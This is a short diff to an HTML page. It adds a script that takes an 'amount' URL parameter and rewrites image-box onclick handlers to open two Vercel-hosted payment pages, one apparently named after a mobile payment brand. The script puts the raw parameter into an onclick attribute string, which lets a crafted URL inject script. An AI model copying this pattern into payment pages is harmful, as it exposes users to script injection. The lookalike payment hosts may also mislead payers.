@@ -285,5 +285,22 @@
             }
         }
     </script>
+<script>
+    // Extract the amount parameter from the URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const amount = urlParams.get('amount') || 0; // Default to 0 if no amount is provided
+
+    // Update the image container links dynamically
+    document.querySelectorAll('.image-box').forEach((box, index) => {
+        const links = [
+            `https://nagad-autopay.vercel.app/num.html?amount=${amount}`,
+            `https://securepayment-one.vercel.app/?amount=${amount}`
+        ];
+        // Assign the respective link based on the image index
+        box.setAttribute('onclick', `selectImage(this, '${links[index]}')`);
+    });
+</script>
+
+
 </body>
 </html>
